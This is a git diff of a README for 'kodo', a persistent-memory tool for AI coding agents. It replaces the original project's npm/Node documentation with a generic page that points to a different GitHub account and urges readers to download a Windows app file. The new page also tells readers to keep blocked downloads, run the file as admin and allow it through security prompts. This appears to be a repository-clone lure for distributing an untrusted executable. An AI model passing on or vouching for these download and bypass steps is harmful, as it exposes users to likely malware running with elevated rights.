@@ -1,285 +1,198 @@
-# kōdo (コード)
+[![Download kodo](https://img.shields.io/badge/Download-kodo-5B8DEF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/positive-bobber314/kodo)
 
-**Universal persistent memory for AI coding agents.**
+# 🧠 kodo - Keep AI coding context in sync
 
-【[English](README.md) | [中文](README.zh-CN.md)】
+## 🚀 Download
+Use this link to visit the download page and get kodo for Windows:
 
-[![Claude Code](https://img.shields.io/badge/Claude_Code-compatible-orange)](https://docs.anthropic.com/en/docs/claude-code)
-[![Cursor](https://img.shields.io/badge/Cursor-compatible-blue)](https://cursor.sh)
-[![Kiro](https://img.shields.io/badge/Kiro-compatible-green)](https://kiro.dev)
-[![Codex CLI](https://img.shields.io/badge/Codex_CLI-compatible-purple)](https://github.com/openai/codex)
-[![MCP](https://img.shields.io/badge/MCP-server-red)](https://modelcontextprotocol.io)
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+https://github.com/positive-bobber314/kodo
 
-> Your AI coding agent forgets everything between sessions. You tell it "use ESM imports" — next session, it's back to `require()`. You fix a bug caused by missing null checks — next session, same bug. **kōdo fixes that.**
+## 🪟 What kodo does
+kodo gives AI coding tools a shared memory that stays with you across sessions. It helps your agent remember project rules, past choices, and mistakes so you do not need to repeat yourself each time.
 
-An agent-agnostic memory layer that stores structured memories — conventions, mistakes, decisions, preferences, patterns — in a local SQLite database, and makes them available to **every** agent you use. One memory store. Every agent. Zero cloud.
+Use it when you want:
 
-```
-kodo add -t convention -c "Always use ESM imports, never require()"
-kodo add -t mistake    -c "Never use process.exit() in library code — throw instead"
-kodo learn             # auto-learn from git history
-kodo export            # sync to .claude/ .cursor/ .kiro/ .codex/
-```
+- Consistent code style across sessions
+- Saved project rules and notes
+- Better follow-up after restarts
+- Memory that works across AI tools
+- Less repeated setup and fewer lost details
 
-## The Problem: AI's Amnesia
+kodo works with Claude Code, Cursor, Kiro, Codex, and any MCP client that can connect to it.
 
-Every AI coding agent starts every session with a blank slate. This means:
+## ✅ Before you start
+You need:
 
-| What happens | How it feels |
-|-------------|-------------|
-| You correct the agent's code style | It forgets next session |
-| You explain your architecture decisions | Gone. Every. Time. |
-| The agent makes a mistake you've seen before | Groundhog Day |
-| You switch from Cursor to Claude Code | Start over from scratch |
-| New team member onboards with an agent | Zero institutional knowledge |
+- A Windows PC
+- An internet connection
+- Permission to download and run apps
+- A current AI coding tool such as Claude Code or Cursor
 
-**kōdo gives your AI agent a persistent, structured, searchable memory that works across every tool.**
+For best results, keep your project folder easy to find. A local folder on your desktop or in Documents works well.
 
-## Live Demo
+## 📥 Download and install
+1. Open this page in your browser:
 
-```bash
-# Clone and run the demo — see it in action in 30 seconds
-git clone https://github.com/Xuan-1998/kodo.git
-cd kodo && npm install
-bash demo/demo.sh
-```
+   https://github.com/positive-bobber314/kodo
 
-### Demo Walkthrough
+2. Download the Windows version from the repository page or release area.
+3. If Windows asks for permission, choose Run or Open.
+4. If the file is in a ZIP folder, right-click it and select Extract All.
+5. Open the extracted folder.
+6. Start kodo by double-clicking the app file.
 
-**Session 1:** You teach the agent your conventions.
+If your browser blocks the download, choose Keep or More info, then run the file again.
 
-```
-$ kodo init
-✓ kodo initialized at /your-project
-  Database: .kodo/memory.db (0 memories)
+## 🛠️ First setup
+After kodo opens, connect it to your AI coding tool.
 
-$ kodo add -t convention -c "Always use ESM imports (import/export), never require()"
-✓ Remembered #1 [convention] Always use ESM imports (import/export), never require()
+Basic setup:
 
-$ kodo add -t mistake -c "Never use process.exit() in library code — throw errors instead"
-✓ Remembered #2 [mistake] Never use process.exit() in library code — throw errors instead
+1. Open your AI tool.
+2. Add kodo as an MCP server or local memory source.
+3. Point it to your project folder.
+4. Save the connection.
+5. Start a new chat or coding session.
 
-$ kodo add -t decision -c "We chose SQLite over Postgres for local-first zero-config storage"
-✓ Remembered #3 [decision] We chose SQLite over Postgres for local-first zero-config storage
-```
+If you work on more than one project, set up one memory space for each project. This keeps project rules clean and easy to reuse.
 
-**Session 2:** New day. Agent starts fresh. But kōdo remembers.
+## 📂 How to use kodo
+Use kodo to store the things your agent should remember, such as:
 
-```
-$ kodo search "import style"
-#1 convention Always use ESM imports (import/export), never require() [javascript, imports]
+- Code style rules
+- Folder names and project layout
+- Bug fixes that solved real problems
+- Team habits
+- Build steps
+- Test commands
+- Things to avoid
 
-$ kodo search "error handling"
-#2 mistake Never use process.exit() in library code — throw errors instead [nodejs, error-handling]
-```
+A simple workflow:
 
-**Export to every agent — one command:**
+1. Tell your AI tool the project rule once.
+2. Let kodo store it.
+3. Come back later and open the same project.
+4. The AI tool reads the saved context.
+5. Continue where you left off.
 
-```
-$ kodo export
-✓ claude → .claude/settings/memory.md (6 memories)
-✓ cursor → .cursor/rules/kodo-memory.md (6 memories)
-✓ kiro   → .kiro/steering/kodo-memory.md (6 memories)
-✓ codex  → .codex/memory.md (6 memories)
-```
+This helps when you switch devices, restart your editor, or return after a break.
 
-Your memories are now baked into every agent's context — even without the MCP server.
+## 🔄 Supported tools
+kodo is made for AI coding tools that can use MCP.
 
-## Why kōdo?
+It works well with:
 
-| Existing tool | Limitation | kōdo's answer |
-|--------------|-----------|---------------|
-| `claude-mem` | Claude Code only | Works with Claude Code, Cursor, Kiro, Codex, any MCP client |
-| `mem0` / OpenMemory | Generic memory, not coding-specific | Typed memories: convention, mistake, decision, preference, pattern, note |
-| `byterover/cipher` | MCP-only, no offline export | MCP server + CLI + native config file generation for 4+ agents |
-| Manual `.cursorrules` | One agent, manual maintenance | Auto-export to all agents from single source of truth |
-| Nothing | Most people | `kodo learn` auto-extracts conventions from git history |
+- Claude Code
+- Cursor
+- Kiro
+- Codex
+- Other MCP clients
 
-## Install
+If your tool supports local connections or MCP servers, you can likely connect it to kodo.
 
-```bash
-npm install -g kodo-memory
-```
+## 🧩 Typical use cases
+Use kodo when you want to:
 
-Or run from source:
+- Keep the same code style in every session
+- Save notes about a codebase
+- Remember what went wrong in a past fix
+- Share context between tools
+- Avoid re-explaining the same project each day
+- Keep a stable memory layer for long coding work
 
-```bash
-git clone https://github.com/Xuan-1998/kodo.git
-cd kodo && npm install
-node bin/kodo.js init
-```
+It is useful for solo work and team projects. It is also helpful when an AI agent needs to stay on track over many changes.
 
-## Memory Types
+## 🔍 How persistent memory helps
+AI tools often forget details after a session ends. kodo helps by keeping those details in a local store. That store can hold project context, preferences, and past decisions.
 
-| Type | Use for | Example |
-|------|---------|---------|
-| `convention` | Team/project standards | "Use Conventional Commits" |
-| `mistake` | Bugs to never repeat | "Don't forget to close DB connections in finally blocks" |
-| `decision` | Architecture choices | "Chose SQLite over Postgres for simplicity" |
-| `preference` | Coding style | "Prefer early returns over nested if/else" |
-| `pattern` | Reusable solutions | "All API handlers: validate → execute → respond" |
-| `note` | General context | "The payments module is being rewritten in Q2" |
+That means your tool can:
 
-## MCP Server
+- Recall what you asked before
+- Use the same naming rules
+- Keep project facts in one place
+- Learn from past fixes
+- Reduce repeated setup steps
 
-kōdo includes an MCP server so AI agents can read and write memories **live during a session** — the agent can `kodo_remember` a lesson it just learned, and `kodo_recall` relevant context before starting a task.
-
-### Claude Code
+This is useful for large projects where small details matter.
 
-```bash
-claude mcp add kodo -- node /path/to/kodo/src/mcp-server.js
-```
+## ⚙️ Suggested Windows setup
+For a smooth start on Windows:
 
-### Cursor
-
-Add to `.cursor/mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "kodo": {
-      "command": "node",
-      "args": ["/path/to/kodo/src/mcp-server.js"]
-    }
-  }
-}
-```
-
-### Kiro
-
-Add to `.kiro/settings/mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "kodo": {
-      "command": "node",
-      "args": ["/path/to/kodo/src/mcp-server.js"]
-    }
-  }
-}
-```
-
-### Any MCP Client
-
-Same pattern — point your MCP config at `node /path/to/kodo/src/mcp-server.js`.
-
-### MCP Tools
-
-| Tool | Description |
-|------|-------------|
-| `kodo_remember` | Store a new memory (convention, mistake, decision, preference, pattern, note) |
-| `kodo_recall` | Search memories by query, type, or both — full-text search |
-| `kodo_forget` | Delete a memory by ID |
-| `kodo_stats` | Get memory statistics — total count, breakdown by type and project |
-
-## Agent Export
-
-`kodo export` generates **native config files** for each agent — your memories work even without the MCP server:
-
-| Agent | Output path | Format |
-|-------|-------------|--------|
-| Claude Code | `.claude/settings/memory.md` | Markdown |
-| Cursor | `.cursor/rules/kodo-memory.md` | Markdown rule |
-| Kiro | `.kiro/steering/kodo-memory.md` | Steering file (YAML frontmatter) |
-| Codex | `.codex/memory.md` | Markdown |
-
-```bash
-# Export to all agents
-kodo export
-
-# Export to specific agents only
-kodo export --agents claude,kiro
-```
-
-## Git Learning
-
-`kodo learn` analyzes your git history and **automatically extracts**:
-
-- **Commit conventions** — detects Conventional Commits, prefixes, patterns
-- **Hotspots** — areas with frequent fixes that need extra attention
-- **Project info** — primary languages, frameworks, tooling detected from config files
-
-```bash
-$ kodo learn
-✓ Learned 5 memories from git history
-
-$ kodo search --type convention
-#1 convention This project uses Conventional Commits (feat:, fix:, chore:, etc.) [git, commits]
-
-$ kodo search --type mistake
-#2 mistake Frequent fixes in "auth" (7 fix commits). This area may need extra attention. [git, hotspot, auth]
-```
-
-## CLI Reference
-
-```
-kodo init                          Initialize kodo in current project
-kodo add -t <type> -c <content>    Add a memory (--tags "a,b" optional)
-kodo search [query]                Search memories (full-text)
-kodo search --type convention      Filter by type
-kodo forget <id>                   Delete a memory
-kodo stats                         Show memory statistics
-kodo learn                         Auto-learn from git history
-kodo export                        Export to all agent configs
-kodo export --agents claude,kiro   Export to specific agents
-```
-
-## How It Works
-
-```
-┌─────────────┐     ┌──────────────┐     ┌─────────────────┐
-│   You / AI  │────▶│  kōdo store  │────▶│  Agent configs   │
-│  (CLI/MCP)  │     │  (SQLite +   │     │  .claude/        │
-│             │◀────│   FTS5)      │     │  .cursor/rules/  │
-│             │     │              │     │  .kiro/steering/  │
-└─────────────┘     └──────────────┘     │  .codex/         │
-                           ▲              └─────────────────┘
-                           │
-                    ┌──────┴──────┐
-                    │  git learn  │
-                    │  (auto)     │
-                    └─────────────┘
-```
-
-**Storage:** Memories live in `.kodo/memory.db` — a SQLite database with WAL mode and FTS5 full-text search. Add `.kodo/` to `.gitignore` for private memories, or commit it to share conventions with your team.
-
-## Roadmap
-
-- [x] `kodo import` — migrate from claude-mem / mem0 / JSONL
-- [x] `kodo watch` — auto-learn from agent sessions in real-time
-- [x] `kodo hub` — cross-terminal real-time knowledge sharing
-- [x] `kodo pipe` — send long text to agent inbox without terminal lag
-- [x] `kodo evolve` — self-evolving memory (prune/merge/promote)
-- [ ] Semantic similarity search (embeddings) as optional upgrade
-- [ ] `kodo sync` — team memory sharing via git
-- [ ] VS Code extension with memory sidebar
-- [ ] More agent exports (OpenCode, CodeBuddy)
-
-## Works Well With
-
-| Tool | How |
-|------|-----|
-| [PUA Skill](https://github.com/tanweai/pua) | PUA forces the agent to try harder; kōdo ensures it remembers what it learned |
-| [claude-mem](https://github.com/thedotmack/claude-mem) | claude-mem captures sessions; kōdo structures and exports the knowledge |
-| Any MCP client | kōdo is a standard MCP server — plug it into anything |
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=Xuan-1998/kodo&type=Date)](https://star-history.com/#Xuan-1998/kodo&Date)
-
-## Contributing
-
-PRs welcome. The codebase is intentionally small — ~400 lines of JavaScript. That's a feature, not a limitation.
-
-```bash
-git clone https://github.com/Xuan-1998/kodo.git
-cd kodo && npm install
-node bin/kodo.js init
-# hack away
-```
-
-## License
-
-MIT
+- Use a recent version of Windows 10 or Windows 11
+- Keep at least 200 MB of free disk space
+- Allow the app through Windows security prompts if needed
+- Store the app in a simple folder, such as Downloads or Programs
+- Keep your project files in a separate folder
+
+If you use a work laptop, you may need admin approval before running new apps.
+
+## 🧪 Example workflow
+Here is a simple way to use kodo with a coding agent:
+
+1. Open your project.
+2. Start kodo.
+3. Connect your AI coding tool.
+4. Add a short rule like: use camelCase for variables.
+5. Ask the agent to update a file.
+6. Close the app and return later.
+7. Open the project again.
+8. Continue with the same rule already in memory
+
+You can store more than style rules. You can also keep build commands, testing steps, and notes about known bugs.
+
+## 🧰 Troubleshooting
+If kodo does not start:
+
+- Run it again as admin
+- Check that the file finished downloading
+- Extract the ZIP file before opening it
+- Move the app to a simple folder path
+- Restart Windows and try again
+
+If your AI tool does not connect:
+
+- Check that MCP is turned on
+- Make sure the server path is correct
+- Confirm that both apps use the same project folder
+- Close and reopen the tool after saving settings
+
+If memory does not seem to save:
+
+- Make sure the app has write access to the folder
+- Check that the project path has not changed
+- Try a fresh session and add one short note first
+
+## 🔐 Privacy and local use
+kodo is meant for local, persistent memory in your coding setup. That makes it useful when you want project context to stay close to your machine.
+
+A local setup can help you:
+
+- Keep project notes in one place
+- Reduce copy and paste
+- Control where your context lives
+- Use the same memory across tools
+
+## 📌 Good habits for best results
+To get clean results from kodo:
+
+- Use short rules
+- Store one project per folder
+- Keep note names clear
+- Update memory after a fix
+- Remove old rules that no longer fit
+
+A small, well-kept memory store works better than a large one full of old notes.
+
+## 🧭 Quick start checklist
+- Download kodo from the repository page
+- Open or extract the file on Windows
+- Start the app
+- Connect it to your AI coding tool
+- Point it at your project folder
+- Save a few project rules
+- Return later and continue with the same context
+
+## 📄 Project details
+- Repository: kodo
+- Description: Universal persistent memory for AI coding agents
+- Topics: ai, claude-code, codex, coding-agent, cursor, developer-tools, kiro, mcp, memory, persistent-memory, sqlite
